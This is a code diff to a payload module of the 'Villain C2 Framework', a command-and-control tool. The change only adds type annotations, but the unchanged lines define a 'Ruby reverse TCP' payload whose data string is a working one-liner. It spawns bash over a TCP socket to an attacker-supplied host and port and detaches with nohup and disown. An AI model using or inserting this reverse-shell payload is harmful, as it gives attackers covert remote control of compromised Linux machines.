@@ -1,27 +1,30 @@
 # This module is part of the "Villain C2 Framework"
 
+from typing import ClassVar
+
+
 class Payload:
 
-    info = {
+    info: ClassVar[dict] = {
         'Title' : 'Ruby reverse TCP',
         'Author' : 'Unknown',
         'Description' : 'Ruby reverse TCP',
         'References' : ['https://revshells.com']
     }
 
-    meta = {
+    meta: ClassVar[dict] = {
         'handler' : 'netcat',
         'type' : 'ruby-reverse-tcp',
         'os' : 'linux'  
     }
 
-    config = {}
+    config: ClassVar[dict] = {}
 
-    parameters = {
+    parameters: ClassVar[dict] = {
         'lhost' : None
     }
 
-    attrs = {}
+    attrs: ClassVar[dict] = {}
 
     data = "nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
     
